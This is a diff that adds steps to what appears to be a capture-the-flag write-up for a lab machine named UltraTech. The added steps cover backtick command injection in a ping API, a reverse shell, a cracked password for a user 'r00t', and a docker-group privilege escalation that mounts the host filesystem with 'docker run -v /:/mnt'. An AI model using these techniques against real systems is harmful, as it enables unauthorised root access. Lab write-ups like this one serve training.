@@ -66,3 +66,24 @@ if we visit the /utech_sitemap.txt
 /what.html
 /partners.html
 ```
+
+we exploit the ping API with using the ``` ` ``` char that is interpreted as bash and not filtered\
+we do a reverse shell
+
+we found a file 
+we crack the password of r00t that is : n100906
+
+finally we found that r00t user is in docker group so we can privesc
+```sh
+r00t@ultratech-prod:~$ groups
+r00t docker
+r00t@ultratech-prod:~$ docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+bash                latest              495d6437fc1e        4 years ago         15.8MB
+```
+
+and we are finally root on docker, we can access filesystem by browsing to /mnt
+```bash
+r00t@ultratech-prod:~$ docker run -v /:/mnt -it bash
+bash-5.0#
+```
